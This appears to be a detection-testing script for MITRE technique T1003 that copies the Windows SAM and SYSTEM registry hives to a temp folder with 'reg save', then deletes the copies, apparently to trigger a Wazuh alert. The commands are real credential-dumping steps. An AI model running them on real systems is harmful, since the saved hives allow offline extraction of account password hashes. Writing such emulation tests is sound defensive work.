# T1003 - OS Credential Dumping
# Simulates dumping SAM and SYSTEM hives for offline credential extraction
# Expected detection: Wazuh rule 92026

reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak

Start-Sleep -Seconds 5
Remove-Item C:\Windows\Temp\sam.bak -Force
Remove-Item C:\Windows\Temp\system.bak -Force
